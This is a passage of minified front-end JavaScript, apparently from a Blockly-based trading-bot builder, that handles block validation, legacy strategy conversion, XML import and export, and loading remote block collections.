                                    for (; null !== n;) {
                                        if (n.id === e.blockId) return !0;
                                        n = n.getParent()
                                    }
                                }
                                return !1
                            };
                        this.workspace.getAllBlocks(!0).forEach(e => {
                            if (t || n() || a() || i() || l() || o(e) || s(e) || r(e)) {
                                if (e.disabled) {
                                    let t = e => {
                                        e.forEach(e => {
                                            e.setErrorHighlighted(!1), t(e.getChildren())
                                        })
                                    };
                                    t([e]);
                                    return
                                }
                                if (!e.getRequiredValueInputs) return;
                                let n = e.getRequiredValueInputs(),
                                    a = Object.keys(n).some(t => {
                                        let a = window.Blockly.getSelected() === e,
                                            i = e.disabled || e.getInheritedDisabled();
                                        if (a || i) return !1;
                                        if (e.isCollapsed() && e.hasErrorHighlightedDescendant()) return !0;
                                        let l = e.getInput(t);
                                        if (l || e.domToMutation) {
                                            if (l.connection) {
                                                let a = window.Blockly.JavaScript.javascriptGenerator.ORDER_ATOMIC,
                                                    i = window.Blockly.JavaScript.javascriptGenerator.valueToCode(e, t, a),
                                                    l = n[t];
                                                return "function" == typeof l ? !!l(i) : !i
                                            }
                                        } else console.warn("Detected a non-existent required input.", {
                                            input_name: t,
                                            type: e.type
                                        });
                                        return !0
                                    });
                                if (a && e.removeSelect(), e.setErrorHighlighted(a, e.error_message || void 0), t && (e.is_error_highlighted || e.hasErrorHighlightedDescendant())) {
                                    let t = e;
                                    for (; t;) t.setCollapsed(!1), t = t.getParent()
                                }
                            }
                        })
                    }
                    getStrategySounds() {
                        let e = this.workspace.getAllBlocks().filter(e => "notify" === e.type),
                            t = [];
                        return e.forEach(e => {
                            let n = e.inputList[0].fieldRow[3].value_;
                            "silent" !== n && t.push(n)
                        }), t
                    }
                    static handleDragOver(e) {
                        e.stopPropagation(), e.preventDefault(), e.dataTransfer.dropEffect = "copy"
                    }
                    static handleDropOver(e, t) {
                        let n = document.getElementById("scratch_div"),
                            a = document.getElementById("load-strategy__local-dropzone-area");
                        n.contains(e.target) ? t(e) : a && a.contains(e.target) ? t(e, !1) : (e.stopPropagation(), e.preventDefault(), e.dataTransfer.effectAllowed = "none", e.dataTransfer.dropEffect = "none")
                    }
                    constructor() {
                        (0, o._)(this, "terminateConnection", () => {
                            d.DO.terminate()
                        }), this.interpreter = null, this.workspace = null, this.before_run_funcs = [], this.symbol = null, this.is_bot_running = !1
                    }
                }
                let tE = new tT
            },
            8813: function(e, t, n) {
                "use strict";
                n.d(t, {
                    O: function() {
                        return i
                    }
                });
                let a = () => {
                        let e = Blockly;
                        e.Colours.RootBlock = {
                            colour: "#2c323c",
                            colourSecondary: "#2c323c",
                            colourTertiary: "#6d7278"
                        }, e.Colours.Base = {
                            colour: "#e5e5e5",
                            colourSecondary: "#ffffff",
                            colourTertiary: "#6d7278"
                        }, e.Colours.Special1 = {
                            colour: "#e5e5e5",
                            colourSecondary: "#ffffff",
                            colourTertiary: "#6d7278"
                        }, e.Colours.Special2 = {
                            colour: "#e5e5e5",
                            colourSecondary: "#ffffff",
                            colourTertiary: "#6d7278"
                        }, e.Colours.Special3 = {
                            colour: "#e5e5e5",
                            colourSecondary: "#ffffff",
                            colourTertiary: "#6d7278"
                        }, e.Colours.Special4 = {
                            colour: "#e5e5e5",
                            colourSecondary: "#000000",
                            colourTertiary: "#0e0e0e"
                        }
                    },
                    i = () => a()
            },
            1560: function(e, t, n) {
                "use strict";
                n.d(t, {
                    M: function() {
                        return s
                    },
                    p: function() {
                        return o
                    }
                });
                var a = n(93162),
                    i = n.n(a),
                    l = n(47962);
                let o = e => {
                        let {
                            data: t,
                            filename: n,
                            type: a
                        } = e, l = new Blob([t], {
                            type: a
                        });
                        i().saveAs(l, n)
                    },
                    s = (e, t) => {
                        let n = (0, l.vc)().opposites[t.toUpperCase()];
                        if (!n) return (0, l.vc)().NOT_AVAILABLE_DROPDOWN_OPTIONS;
                        let a = n.map(e => Object.entries(e)[0].reverse());
                        return "both" !== e ? a.filter(t => t[1] === e) : a
                    }
            },
            56443: function(e, t, n) {
                "use strict";
                n.d(t, {
                    zD: () => C,
                    oG: () => I,
                    Z3: () => J,
                    a1: () => N,
                    yW: () => j,
                    NW: () => ea,
                    P_: () => H,
                    Hh: () => x,
                    ox: () => k,
                    Y2: () => A,
                    UR: () => G,
                    zJ: () => Y,
                    $9: () => X,
                    j3: () => ee,
                    ei: () => Z,
                    dd: () => g,
                    Tj: () => y,
                    AA: () => et,
                    TU: () => en,
                    cM: () => $,
                    nf: () => F
                });
                var a = n("85893");
                n("67294");
                var i = n("73935"),
                    l = n("66175"),
                    o = n("48059"),
                    s = n("47962"),
                    r = n("51434"),
                    d = n("55967"),
                    c = n("66345"),
                    u = n("65464"),
                    m = n("26855"),
                    b = n("13604"),
                    p = n("94576");
                class f {
                    getConversions() {
                        var e = this;
                        let t = (e, t, n, a) => {
                                let i = this.workspace.newBlock(t),
                                    l = Array.from(e.children),
                                    o = l.find(e => "mutation" === e.tagName.toLowerCase());
                                if (o) {
                                    let e = parseInt(o.getAttribute("items")) || 0;
                                    if (e > 0) {
                                        for (let t = 0; t < e; t++) i.onIconClick();
                                        l.filter(e => "value" === e.tagName.toLowerCase()).forEach(e => {
                                            let t = parseInt(e.getAttribute("name").replace(/[^0-9]+/g, ""));
                                            Array.from(e.children).forEach(e => {
                                                let n = this.convertBlockNode(e, i);
                                                i.getBlocksInStatement("STACK").find((e, n) => t === n).getInput(a).connection.connect(n.outputConnection)
                                            });
                                            let n = e.parentNode;
                                            n && e && (null == n ? void 0 : n.contains(e)) && (null == n || n.removeChild(e))
                                        })
                                    }
                                }
                                let s = this.generateUniqueVariable(n),
                                    r = this.workspace.newBlock("variables_get");
                                return r.setFieldValue(s.getId(), "VAR"), i.setFieldValue(s.getId(), "VARIABLE"), {
                                    block_to_attach: r,
                                    statement_blocks: [i]
                                }
                            },
                            n = (e, t, n) => {
                                let a = this.workspace.newBlock(t),
                                    i = {
                                        input_list: [{
                                            old: "INPUT",
                                            new: "INPUT_LIST"
                                        }],
                                        period: [{
                                            old: "PERIOD",
                                            new: "PERIOD"
                                        }],
                                        fast_ema_period: [{
                                            old: "FAST_EMA_PERIOD",
                                            new: "FAST_EMA_PERIOD"
                                        }],
                                        signal_ema_period: [{
                                            old: "SMA_PERIOD",
                                            new: "SIGNAL_EMA_PERIOD"
                                        }, {
                                            old: "SIGNAL_EMA_PERIOD",
                                            new: "SIGNAL_EMA_PERIOD"
                                        }],
                                        slow_ema_period: [{
                                            old: "SLOW_EMA_PERIOD",
                                            new: "SLOW_EMA_PERIOD"
                                        }],
                                        std_dev_multiplier_up: [{
                                            old: "UPMULTIPLIER",
                                            new: "UPMULTIPLIER"
                                        }],
                                        std_dev_multiplier_down: [{
                                            old: "DOWNMULTIPLIER",
                                            new: "DOWNMULTIPLIER"
                                        }]
                                    };
                                switch (t) {
                                    case "bb_statement":
                                    case "bba_statement":
                                        {
                                            let t = a.getField("BBRESULT_LIST");t && t.setValue(this.getFieldValue(e, "BBRESULT_LIST"));
                                            break
                                        }
                                    case "macda_statement":
                                        {
                                            let t = a.getField("MACDFIELDS_LIST");t && t.setValue(this.getFieldValue(e, "MACDFIELDS_LIST"))
                                        }
                                }(a.required_child_blocks || []).forEach(e => {
                                    let t = this.workspace.newBlock(e);
                                    a.getLastConnectionInStatement("STATEMENT").connect(t.previousConnection)
                                }), a.getBlocksInStatement("STATEMENT").forEach(t => {
                                    let n = i[t.type];
                                    n && n.forEach(n => {
                                        let i = e.querySelector(`value[name="${n.old}"]`);
                                        if (i) {
                                            let e = t.getInput(n.new);
                                            Array.from(i.children).forEach(t => {
                                                let n = this.convertBlockNode(t, a);
                                                "shadow" === t.tagName.toLowerCase() && n.setShadow(!0), e.connection.connect(n.outputConnection)
                                            });
                                            let o = null == i ? void 0 : i.parentNode;
                                            if (o && i && (null == o ? void 0 : o.contains(i))) {
                                                var l;
                                                null == i || null === (l = i.parentNode) || void 0 === l || l.removeChild(i)
                                            }
                                        }
                                    })
                                });
                                let l = this.generateUniqueVariable(n),
                                    o = this.workspace.newBlock("variables_get");
                                return o.setFieldValue(l.getId(), "VAR"), a.setFieldValue(l.getId(), "VARIABLE"), {
                                    block_to_attach: o,
                                    statement_blocks: [a]
                                }
                            },
                            a = function(t) {
                                let n = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
                                    a = e.workspace.newBlock("trade_definition_tradeoptions");
                                if (n) return !1;
                                let i = Array.from(t.children),
                                    l = 0,
                                    o = !1;
                                return i.filter(e => "value" === e.tagName.toLowerCase()).forEach(e => {
                                    let t = e.getAttribute("name");
                                    "BARRIEROFFSET" === t || "SECONDBARRIEROFFSET" === t ? l++ : "PREDICTION" === t && (o = !0)
                                }), l > 0 && a.createBarrierInputs({
                                    allow_both_types: !0,
                                    values: [1, -1]
                                }), o && a.createPredictionInput([0]), ["DURATIONTYPE_LIST", "CURRENCY_LIST", "BARRIEROFFSETTYPE_LIST", "SECONDBARRIEROFFSETTYPE_LIST"].forEach(n => {
                                    let i = a.getField(n);
                                    i && i.setValue(e.getFieldValue(t, n))
                                }), {
                                    block_to_attach: a
                                }
                            };
                        return {
                            bb: e => n(e, "bb_statement", "bb"),
                            bba: e => n(e, "bba_statement", "bba"),
                            ema: e => n(e, "ema_statement", "ema"),
                            emaa: e => n(e, "emaa_statement", "emaa"),
                            lists_create_with: e => t(e, "lists_create_with", (0, o.NC)("list"), "VALUE"),
                            macda: e => n(e, "macda_statement", "macda"),
                            market: e => (this.has_market_block = !0, a(e)),
                            rsi: e => n(e, "rsi_statement", "rsi"),
                            rsia: e => n(e, "rsia_statement", "rsia"),
                            sma: e => n(e, "sma_statement", "sma"),
                            smaa: e => n(e, "smaa_statement", "smaa"),
                            text_join: e => t(e, "text_join", (0, o.NC)("text"), "TEXT"),
                            trade: e => {
                                let t = this.workspace.newBlock("trade_definition"),
                                    n = {
                                        trade_definition_market: ["MARKET_LIST", "SUBMARKET_LIST", "SYMBOL_LIST"],
                                        trade_definition_tradetype: ["TRADETYPECAT_LIST", "TRADETYPE_LIST"],
                                        trade_definition_contracttype: ["TYPE_LIST"],
                                        trade_definition_candleinterval: ["CANDLEINTERVAL_LIST"],
                                        trade_definition_restartbuysell: ["TIME_MACHINE_ENABLED"],
                                        trade_definition_restartonerror: ["RESTARTONERROR"]
                                    },
                                    a = {};
                                return Object.keys(n).forEach(t => {
                                    let i = this.workspace.newBlock(t);
                                    n[t].forEach(t => {
                                        i.setFieldValue(this.getFieldValue(e, t), t)
                                    }), a[t] = i
                                }), Object.values(a).forEach(e => {
                                    t.getLastConnectionInStatement("TRADE_OPTIONS").connect(e.previousConnection)
                                }), {
                                    block_to_attach: t
                                }
                            },
                            tradeOptions: a
                        }
                    }
                    getIllegalBlocks() {
                        var e;
                        let t = [],
                            {
                                active_symbols: n
                            } = (null === b.Z || void 0 === b.Z ? void 0 : null === (e = b.Z.instance) || void 0 === e ? void 0 : e.active_symbols) ? ? {
                                active_symbols: []
                            },
                            {
                                opposites: a
                            } = (0, s.vc)();
                        return n.forEach(e => {
                            let n = e.symbol.toLowerCase();
                            !t.includes(n) && t.push(n)
                        }), Object.keys(a).forEach(e => t.push(e)), t
                    }
                    createWorkspace() {
                        let e = new window.Blockly.Options({
                                media: "assets/images"
                            }),
                            t = new DocumentFragment;
                        return window.Blockly.createVirtualWorkspace_(t, e, !1, !1)
                    }
                    getFieldValue(e, t) {
                        let n = e.querySelector(`field[name="${t}"]`);
                        return n ? n.textContent : ""
                    }
                    getFirstBlockInStack(e) {
                        let t = e.previousConnection,
                            n = e.getPreviousBlock();
                        if (!t) return e;
                        for (; n && n !== e.getSurroundParent();) {;
                            t = n.previousConnection, n = n.getPreviousBlock()
                        }
                        return t.sourceBlock_
                    }
                    updateRenamedFields(e) {
                        let t = {
                            MARKET_LIST: {
                                volidx: "synthetic_index"
                            },
                            TRADETYPECAT_LIST: {
                                endsinout: "inout",
                                staysinout: "inout",
                                callputequal: "callput"
                            },
                            TRADETYPE_LIST: {
                                risefall: "callput",
                                risefallequals: "callputequal"
                            }
                        };
                        return Object.keys(t).forEach(n => {
                            let a = e.querySelector(`field[name="${n}"]`);
                            if (a) {
                                let e = a.innerText;
                                Object.keys(t[n]).forEach(i => {
                                    e === i && (a.innerText = t[n][i])
                                })
                            }
                        }), e
                    }
                    naivelyFixLegacyStrategyAfterConversion() {
                        var e;
                        let t = null === (e = this.workspace) || void 0 === e ? void 0 : e.getTradeDefinitionBlock(),
                            n = (null == t ? void 0 : t.getBlocksInStatement("INITIALIZATION").length) > 0;
                        t && t.getBlocksInStatement("SUBMARKET").forEach(e => {
                            if ("trade_definition_tradeoptions" !== e.type && this.has_market_block && !n) {
                                let n = t.getLastConnectionInStatement("INITIALIZATION");
                                e.unplug(!0), n.connect(e.previousConnection)
                            }
                        })
                    }
                    generateUniqueVariable(e) {
                        let t = e,
                            n = 0;
                        for (; Object.values(this.workspace_variables).includes(t);) t = e + ++n;
                        let a = window.Blockly.Variables.getOrCreateVariablePackage(this.workspace, "", t, "");
                        return this.workspace_variables[a.id_] = t, a
                    }
                    convertStrategy(e, t) {
                        window.Blockly.Events.disable();
                        let n = this.updateRenamedFields(e);
                        if (e.hasAttribute("is_dbot") && "true" === e.getAttribute("is_dbot")) return window.Blockly.Events.enable(), n;
                        if (this.getIllegalBlocks().some(e => {
                                if (!this.exception_blocks.includes(e)) return !!n.querySelector(`block[type="${e}"]`)
                            })) return t && t(), window.Blockly.Events.enable(), window.Blockly.utils.xml.textToDom("<xml />");
                        let a = [],
                            i = [];
                        Array.from(n.children).forEach(e => {
                            switch (e.nodeName.toLowerCase()) {
                                case "block":
                                case "shadow":
                                    i.push(e);
                                    break;
                                case "variables":
                                    a.push(...e.children)
                            }
                        });
                        let l = e => {
                            e.forEach(e => {
                                let t = e.getAttribute("id"),
                                    n = e.textContent;
                                if (!this.workspace_variables[t]) {
                                    let e = window.Blockly.Variables.getOrCreateVariablePackage(this.workspace, t, n, "");
                                    this.workspace_variables[e.id_] = e.name
                                }
                            })
                        };
                        l(a), l(n.querySelectorAll('field[name="VAR"]')), i.forEach(e => this.convertBlockNode(e)), Object.keys(this.blocks_pending_reconnect).forEach(e => {
                            let t = this.workspace.getBlockById(e),
                                n = this.blocks_pending_reconnect[e],
                                a = t.previousConnection;
                            if (a) {
                                let e = a.targetConnection,
                                    i = a;
                                if (n.reverse().forEach(e => {
                                        i.connect(e.nextConnection), i = e.previousConnection
                                    }), e) {
                                    let n = t.previousConnection,
                                        a = t.getPreviousBlock();
                                    for (; a && a !== a.getSurroundParent();) {;
                                        n = a.previousConnection, a = a.getPreviousBlock()
                                    }
                                    e.connect(n)
                                }
                            }
                        }), this.naivelyFixLegacyStrategyAfterConversion(), this.workspace.getAllBlocks(!0).forEach(e => {
                            e.initSvg(), e.renderEfficiently()
                        }), this.workspace.cleanUp();
                        let o = window.Blockly.Xml.workspaceToDom(this.workspace);
                        return (0, p.Xt)(o), this.workspace = null, window.Blockly.Events.enable(), o
                    }
                    convertBlockNode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : null,
                            n = this.getConversions(),
                            a = e.getAttribute("type"),
                            i = Object.keys(n).includes(a),
                            l = null,
                            o = e.getAttribute("collapsed") && "true" === e.getAttribute("collapsed") || !1,
                            s = e.getAttribute("movable") && "false" === e.getAttribute("movable"),
                            r = e.getAttribute("deletable") && "false" === e.getAttribute("deletable"),
                            d = e.getAttribute("disabled") && "true" === e.getAttribute("disabled"),
                            c = e => {
                                e.setCollapsed(o), e.setMovable(!s), e.setDeletable(!r), e.setDisabled(d)
                            };
                        if (i) {
                            let i = n[a](e);
                            i.block_to_attach && c(l = i.block_to_attach), t && i.statement_blocks && i.statement_blocks.forEach(e => {
                                c(e);
                                let n = this.getClosestLegalPreviousConnection(t);
                                if (n) {
                                    let t = n.sourceBlock_;
                                    !this.blocks_pending_reconnect[t.id] && (this.blocks_pending_reconnect[t.id] = []), this.blocks_pending_reconnect[t.id].push(e)
                                }
                            })
                        } else if (Object.keys(window.Blockly.Blocks).includes(a) && (c(l = this.workspace.newBlock(a)), l)) {
                            let t = Array.from(e.children).find(e => "mutation" === e.tagName.toLowerCase());
                            t && l.domToMutation && l.domToMutation(t)
                        }
                        return l ? (t && (l.conversion_parent = t), Array.from(e.children).forEach(e => {
                            switch (e.tagName.toLowerCase()) {
                                case "field":
                                    {
                                        let t = e.getAttribute("name"),
                                            n = l.getField(t);
                                        if (n) {
                                            if (n instanceof window.Blockly.FieldVariable) {
                                                let t = e.getAttribute("id"),
                                                    a = e.innerText.trim(),
                                                    i = window.Blockly.Variables.getOrCreateVariablePackage(this.workspace, t, a, "");
                                                this.workspace_variables[i.id_] = a, n.setValue(i.id_)
                                            } else n.setValue(e.innerText)
                                        }
                                        break
                                    }
                                case "value":
                                    this.processValueInputs(l, e);
                                    break;
                                case "statement":
                                    {
                                        let t = e.getAttribute("name");this.processStatementInputs(l, t, e);
                                        break
                                    }
                                case "next":
                                    {
                                        let t = e.closest("statement");
                                        if (t) {
                                            let n = t.getAttribute("name");
                                            this.processStatementInputs(l, n, e, l.conversion_parent)
                                        } else l.nextConnection && Array.from(e.children).forEach(e => {
                                            let t = this.convertBlockNode(e);
                                            l.nextConnection.connect(t.previousConnection)
                                        })
                                    }
                            }
                        }), l) : (console.warn("Unrecognised block found.", a), !1)
                    }
                    processValueInputs(e, t) {
                        let n = t.getAttribute("name"),
                            a = e.getInput(n);
                        if (!a) return console.warn("Unrecognised value input", n), !1;
                        Array.from(t.children).forEach(t => {
                            let n = this.convertBlockNode(t, e);
                            if (!n) return console.warn("Illegal child.", t.getAttribute("type")), !1;
                            "shadow" === t.tagName.toLowerCase() && n.setShadow(!0), a.connection.connect(n.outputConnection)
                        })
                    }
                    processStatementInputs(e, t, n) {
                        let a = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : null,
                            i = a || e;
                        if (!i.getInput(t)) return console.warn("Unrecognised statement input", t), !1;
                        Array.from(n.children).forEach(e => {
                            let n = this.convertBlockNode(e, i);
                            if (!n) return console.warn("Unrecognised child in statement", e.getAttribute("type")), !1;
                            let a = i.getInput(t);
                            a && n.previousConnection && a.connection.connect(n.previousConnection)
                        })
                    }
                    getClosestLegalPreviousConnection(e) {
                        if ((0, s.vc)().procedureDefinitionBlocks.includes(e.type)) {
                            if (0 === e.getBlocksInStatement("STACK").length) {
                                let t = e.getInput("STACK"),
                                    n = this.workspace.newBlock("useless_block");
                                return t.connection.connect(n.previousConnection), n.previousConnection
                            }
                            return e.getInputTargetBlock("STACK").previousConnection
                        }
                        let t = this.getFirstBlockInStack(e),
                            n = this.isConnectedToProtectedStatementInput(t);
                        for (; n;) {
                            let e = t.getParent();
                            e && (t = e, n = this.isConnectedToProtectedStatementInput(t))
                        }
                        return t.previousConnection ? t.previousConnection : !!e.conversion_parent && this.getClosestLegalPreviousConnection(e.conversion_parent)
                    }
                    isConnectedToProtectedStatementInput(e) {
                        let t = this.getFirstBlockInStack(e).previousConnection;
                        if (t) {
                            let e = t.targetConnection;
                            if (e) {
                                let t = e.sourceBlock_,
                                    n = t.getInputWithConnection(e),
                                    a = t.protected_statements || [];
                                if (n && a.includes(n.name)) return !0
                            }
                        }
                        return !1
                    }
                    constructor() {
                        this.blocks_pending_reconnect = {}, this.workspace = this.createWorkspace(), this.workspace_variables = {}, this.has_market_block = !1, this.exception_blocks = ["r_100"]
                    }
                }
                var _ = n("85872"),
                    h = n("1560");
                let v = e => {
                        let {
                            message: t,
                            onClose: n,
                            onLoadHere: i
                        } = e;
                        return (0, a.jsx)("div", {
                            className: "alert-popup-overlay",
                            children: (0, a.jsxs)("div", {
                                className: "alert-popup-container",
                                children: [(0, a.jsx)("div", {
                                    className: "error-checkmark",
                                    children: (0, a.jsxs)("div", {
                                        className: "cross-icon",
                                        children: [(0, a.jsx)("span", {
                                            className: "icon-line line-left"
                                        }), (0, a.jsx)("span", {
                                            className: "icon-line line-right"
                                        }), (0, a.jsx)("div", {
                                            className: "icon-circle"
                                        })]
                                    })
                                }), (0, a.jsx)("div", {
                                    className: "alert-popup-head",
                                    children: (0, o.NC)("Invalid!!!")
                                }), (0, a.jsx)("div", {
                                    className: "alert-popup-message",
                                    children: t
                                }), (0, a.jsxs)("div", {
                                    className: "alert-popup-buttons",
                                    children: [(0, a.jsx)("button", {
                                        className: "alert-popup-button load-here",
                                        onClick: i,
                                        children: (0, o.NC)("Load Here")
                                    }), (0, a.jsx)("button", {
                                        className: "alert-popup-button close",
                                        onClick: n,
                                        children: (0, o.NC)("Close")
                                    })]
                                })]
                            })
                        })
                    },
                    y = {
                        media: "assets/images/",
                        zoom: {
                            wheel: !0,
                            startScale: (0, s.vc)().workspaces.previewWorkspaceStartScale
                        },
                        readOnly: !0,
                        scrollbars: !0,
                        renderer: "zelos"
                    },
                    k = e => {
                        if (!window.Blockly) return;
                        let {
                            strategy_id: t,
                            convertedDom: n,
                            file_name: a,
                            from: i
                        } = e;
                        window.Blockly.xmlValues = { ...window.Blockly.xmlValues,
                            strategy_id: t,
                            convertedDom: n,
                            file_name: a,
                            from: i
                        }
                    },
                    g = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : window.Blockly.derivWorkspace,
                            t = e.getAllBlocks(!0).find(e => "trade_definition_tradetype" === e.type),
                            n = null == t ? void 0 : t.getFieldValue("TRADETYPE_LIST"),
                            a = "trade_definition_tradeoptions";
                        return "multiplier" === n && (a = "trade_definition_multiplier"), "accumulator" === n && (a = "trade_definition_accumulator"), a
                    },
                    T = e => {
                        let t = e.match(/translate\((-?\d+(?:\.\d+)?),\s*(-?\d+(?:\.\d+)?)\)/);
                        if (t && t.length > 2) {
                            let e = parseFloat(t[1]);
                            return {
                                x: e,
                                y: parseFloat(t[2])
                            }
                        }
                        return null
                    },
                    E = () => {
                        var e, t, n;
                        let a = T(null === (n = window.Blockly) || void 0 === n ? void 0 : null === (t = n.derivWorkspace) || void 0 === t ? void 0 : null === (e = t.trashcan) || void 0 === e ? void 0 : e.svgGroup.getAttribute("transform"));
                        return !a && u.P.emit("Error", "Invalid String"), {
                            translate_X: a.x,
                            translate_Y: a.y
                        }
                    },
                    A = () => {
                        var e, t, n, a, i, l, o;
                        let {
                            translate_X: s,
                            translate_Y: r
                        } = E(), c = null === (e = window.Blockly.getSelected()) || void 0 === e ? void 0 : e.getSvgRoot().getBoundingClientRect(), m = (null == c ? void 0 : c.left) || 0, b = (null == c ? void 0 : c.top) || 0, p = [g(), "trade_definition", "apollo_purchase", "before_purchase"];
                        (null == p ? void 0 : p.includes(null === (n = window.Blockly) || void 0 === n ? void 0 : null === (t = n.getSelected()) || void 0 === t ? void 0 : t.type)) && b >= r - 200 && b <= r + 200 && m >= s - 200 && m <= s + 200 && u.P.emit("ui.log.error", null === d.T || void 0 === d.T ? void 0 : null === (o = (0, d.T)()) || void 0 === o ? void 0 : null === (a = o[null === (l = window.Blockly) || void 0 === l ? void 0 : null === (i = l.getSelected()) || void 0 === i ? void 0 : i.type]) || void 0 === a ? void 0 : a.default)
                    },
                    x = () => {
                        var e, t;
                        if (!(null === _.Z || void 0 === _.Z ? void 0 : _.Z.instance)) return;
                        let {
                            load_modal: n
                        } = _.Z.instance, a = (null == n ? void 0 : null === (t = n.dashboard_strategies) || void 0 === t ? void 0 : null === (e = t[0]) || void 0 === e ? void 0 : e.name) ? ? (0, s.vc)().default_file_name;
                        if (document.title.indexOf("-") > -1) {
                            let e = document.title.substr(document.title.indexOf("-")),
                                t = document.title.replace(e, `- ${a}`);
                            document.title = t
                        } else document.title += ` - ${a}`
                    },
                    w = (e, t, n) => {
                        let {
                            clientX: a = 0,
                            clientY: i = 0
                        } = t || {}, l = n.getMetrics(), o = 1 / n.scale, s = l.absoluteLeft - l.viewLeft, r = document.body.offsetHeight - l.viewHeight - l.viewTop;
                        n.cleanUp(a ? (a - s) * o : 0, i ? (i - r - 76) * o : 0, e)
                    },
                    N = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "@deriv/bot",
                            t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
                            n = arguments.length > 2 ? arguments[2] : void 0;
                        n.setAttribute("is_dbot", "true"), n.setAttribute("collection", t ? "true" : "false");
                        let a = window.Blockly.Xml.domToPrettyText(n);
                        (0, h.p)({
                            data: a,
                            type: "text/xml;charset=utf-8",
                            filename: `${e}.xml`
                        })
                    },
                    S = e => new Promise(t => setTimeout(t, e)),
                    C = async e => {
                        let t, {
                            block_string: n,
                            drop_event: l,
                            file_name: s,
                            strategy_id: d,
                            from: b,
                            workspace: p,
                            showIncompatibleStrategyDialog: h
                        } = e;
                        if (!(null === _.Z || void 0 === _.Z ? void 0 : _.Z.instance) || !p) return;
                        let {
                            setLoading: y,
                            load_modal: g
                        } = _.Z.instance, {
                            setOpenButtonDisabled: T,
                            setLoadedLocalFile: E
                        } = g;
                        y(!0), await S(100);
                        let A = () => {
                            let e = (0, o.NC)("Your import failed due to an invalid file. Upload a complete file in XML format."),
                                t = document.createElement("div");
                            return document.body.appendChild(t), i.render((0, a.jsx)(v, {
                                message: e,
                                onLoadHere: () => {
                                    window.location.href = "gle.site/bot", i.unmountComponentAtNode(t), document.body.removeChild(t)
                                },
                                onClose: () => {
                                    i.unmountComponentAtNode(t), document.body.removeChild(t)
                                }
                            }), t), E(null), y(!1), u.P.emit("ui.log.error", e), {
                                error: e
                            }
                        };
                        try {
                            if (new DOMParser().parseFromString(n, "application/xml").getElementsByTagName("parsererror").length) return A()
                        } catch (e) {
                            return A()
                        }
                        try {
                            t = window.Blockly.utils.xml.textToDom(n)
                        } catch (e) {
                            return A()
                        }
                        t = (0, c.l)(t);
                        let x = (t = new f().convertStrategy(t, h)).querySelectorAll("block");
                        if (!x.length || Array.from(x).some(e => {
                                let t = e.getAttribute("type");
                                return !Object.keys(window.Blockly.Blocks).includes(t)
                            })) return A();
                        try {
                            let e = t.hasAttribute("collection") && "true" === t.getAttribute("collection"),
                                n = e ? `load_collection${Date.now()}` : `dbot-load${Date.now()}`;
                            if (window.Blockly.Events.setGroup(n), (0, m.kH)(p, Array.from(x).map(e => e.getAttribute("type"))), k({
                                    strategy_id: d,
                                    convertedDom: t,
                                    file_name: s,
                                    from: b
                                }), e) O(t, l, n, p);
                            else if (await L(t, n, p), p === window.Blockly.derivWorkspace) {
                                let {
                                    save_modal: e
                                } = _.Z.instance;
                                e.updateBotName(s), p.clearUndo(), p.current_strategy_id = d || window.Blockly.utils.idGenerator.genUid(), await (0, c.l5)(t, b)
                            }
                            p.getAllBlocks().forEach(e => {
                                e.disabled && (e.is_user_disabled_state = !0)
                            }), p === window.Blockly.derivWorkspace && u.P.emit("ui.log.success", {
                                log_type: r.v9.LOAD_BLOCK
                            })
                        } catch (e) {
                            return console.error(e), A()
                        } finally {
                            y(!1), T(!1)
                        }
                    },
                    O = (e, t, n, a) => {
                        window.Blockly.Events.setGroup(n);
                        let i = window.Blockly.Xml.domToWorkspace(e, a).map(e => a.getBlockById(e));
                        t && 0 !== Object.keys(t).length ? w(i, t, a) : a.cleanUp()
                    },
                    L = async (e, t, n) => {
                        window.Blockly.Events.setGroup(t), await n.asyncClear(), window.Blockly.Xml.clearWorkspaceAndLoadFromXml(e, n), n.cleanUp()
                    },
                    R = (e, t) => new Promise((n, a) => {
                        let i;
                        try {
                            i = window.Blockly.utils.xml.textToDom(e)
                        } catch (e) {
                            return a((0, o.NC)("Unrecognized file format"))
                        }
                        try {
                            !(i.hasAttribute("collection") && "true" === i.getAttribute("collection")) && a((0, o.NC)("Remote blocks to load must be a collection.")), D(i).then(() => {
                                Array.from(i.children).forEach(e => U(e, t)), n()
                            }).catch(() => {
                                a()
                            })
                        } catch (e) {
                            a((0, o.NC)("Unable to load the block file."))
                        }
                    }),
                    I = e => new Promise((t, n) => {
                        let a = e.getFieldValue("URL"); - 1 === a.indexOf("http") && (a = `http://${a}`);
                        let i = "/" === a.slice(-1)[0];
                        if (!a.match(/[^/]*\.[a-zA-Z]{3}$/) && !i) return n((0, o.NC)("Target must be an XML file"));
                        if (i && (a += "index.xml"), e.isKnownUrl(a)) return e.setDisabled(!0), n((0, o.NC)("This URL is already loaded"));
                        let l = () => n((0, o.NC)("An error occured while trying to load the URL"));
                        fetch(a).then(n => {
                            n.ok ? n.text().then(n => {
                                R(n, e).then(() => t(e)).catch(l)
                            }) : l()
                        }).catch(l)
                    }),
                    D = e => new Promise((t, n) => {
                        let a = [];
                        Array.from(e.children).forEach(e => {
                            if ("loader" === e.getAttribute("type")) {
                                e.remove();
                                let t = window.Blockly.Xml.domToBlock(e, window.Blockly.derivWorkspace);
                                a.push(I(t))
                            }
                        }), a.length ? Promise.all(a).then(t, n) : t([])
                    }),
                    U = function(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : null;
                        if ("variables" === e.tagName.toLowerCase()) return window.Blockly.Xml.domToVariables(e, window.Blockly.derivWorkspace);
                        let n = e.getAttribute("type"),
                            a = new f,
                            i = window.Blockly.Xml.blockToDom(a.convertBlockNode(e));
                        Array.from(i.getElementsByTagName("arg")).forEach(e => {
                            e.hasAttribute("varid") && e.setAttribute("varId", e.getAttribute("varid"))
                        }), (0, m.kH)(window.Blockly.derivWorkspace, n);
                        let l = window.Blockly.Xml.domToBlock(i, window.Blockly.derivWorkspace);
                        return t && t.blocks_added_by_me.push(l), l
                    },
                    P = (e, t) => e.getAllBlocks().filter(e => {
                        if (t.includes(e.type)) return 0 === e.childBlocks_.length && t.includes(e.category_) || null === e.parentBlock_
                    }),
                    V = (e, t) => t.filter(t => !e.getAllBlocks().some(e => e.type === t)),
                    M = e => e.filter(e => {
